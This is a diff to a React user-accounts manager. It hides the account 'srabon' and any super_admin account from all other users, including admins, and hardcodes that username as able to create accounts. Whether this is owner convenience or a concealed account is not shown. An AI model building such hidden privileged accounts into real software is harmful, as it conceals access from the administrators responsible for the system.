@@ -211,6 +211,14 @@ export const UserAccountsManager: React.FC<UserAccountsManagerProps> = ({ curren
     }
   };
 
+  const visibleUsers = users.filter((u) => {
+    // Hide Srabon Hassan / super_admin from admin and any other non-srabon users
+    if (u.username === 'srabon' || u.role === 'super_admin') {
+      return currentUsername === 'srabon';
+    }
+    return true;
+  });
+
   return (
     <div className="bg-white dark:bg-[#0d141b] rounded-2xl border border-slate-200 dark:border-[#182531] p-5 sm:p-6 shadow-xs">
       {/* Header bar */}
@@ -248,7 +256,7 @@ export const UserAccountsManager: React.FC<UserAccountsManagerProps> = ({ curren
             <RefreshCw size={15} className={isLoading ? 'animate-spin' : ''} />
           </button>
 
-          {currentUsername === 'admin' && (
+          {(currentUsername === 'admin' || currentUsername === 'srabon') && (
             <button
               type="button"
               onClick={openCreateModal}
@@ -276,7 +284,7 @@ export const UserAccountsManager: React.FC<UserAccountsManagerProps> = ({ curren
             </tr>
           </thead>
           <tbody className="divide-y divide-slate-100 dark:divide-[#182531]/60">
-            {users.map((u) => {
+            {visibleUsers.map((u) => {
               const isAdmin = u.role === 'admin' || u.username === 'admin';
               const moduleCount = (u.allowedViews || []).length;
 
